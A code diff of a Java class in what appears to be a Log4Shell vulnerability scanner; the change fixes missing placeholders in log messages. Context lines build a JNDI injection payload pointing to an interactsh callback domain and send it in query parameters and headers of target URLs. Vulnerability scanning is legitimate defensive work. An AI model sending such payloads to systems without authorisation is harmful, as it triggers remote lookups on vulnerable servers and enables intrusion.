@@ -102,13 +102,13 @@ public class ScanApplication {
       String payload = String.format("${jndi:rmi://%s_%s_%s.%s:8443/certmichelin}", (service.isSsl()) ? "https" : "http", service.getDomain(), service.getPort(), interactshConfig.getDomain());
       String url = String.format("%s://%s:%s", (service.isSsl()) ? "https" : "http", service.getDomain(), service.getPort());
 
-      LogManager.getLogger(SpringApplication.class).info(String.format("Start Log4Shell fuzzing :  with payload (%s)", url, payload));
+      LogManager.getLogger(SpringApplication.class).info(String.format("Start Log4Shell fuzzing : %s  with payload (%s)", url, payload));
 
       for (String parameter : parameters) {
         try {
           LogManager.getLogger(SpringApplication.class).info(String.format("Fuzz url (%s) with parameter : %s", url, parameter));
           HttpResponse<String> response = Unirest.get(url).queryString(parameter, payload).asString();
-          LogManager.getLogger(SpringApplication.class).info(String.format("Reponse code from url (%s) with parameter : %s ==> ", url, parameter, response.getStatus()));
+          LogManager.getLogger(SpringApplication.class).info(String.format("Reponse code from url (%s) with parameter : %s ==> %s ", url, parameter, response.getStatus()));
         } catch (UnirestException ex) {
           LogManager.getLogger(ScanApplication.class).error(String.format("Unirest Exception from url (%s) with parameter : %s : %s", url, parameter, ex.getMessage()));
         }
@@ -118,7 +118,7 @@ public class ScanApplication {
         try {
           LogManager.getLogger(SpringApplication.class).info(String.format("Fuzz url (%s) with header : %s", url, header));
           HttpResponse<String> response = Unirest.get(url).header(header, payload).asString();
-          LogManager.getLogger(SpringApplication.class).info(String.format("Reponse code from url (%s) with parameter : %s ==> ", url, header, response.getStatus()));
+          LogManager.getLogger(SpringApplication.class).info(String.format("Reponse code from url (%s) with parameter : %s ==> %s ", url, header, response.getStatus()));
         } catch (UnirestException ex) {
           LogManager.getLogger(ScanApplication.class).error(String.format("Unirest Exception from url (%s) with parameter : %s : %s", url, header, ex.getMessage()));
         }
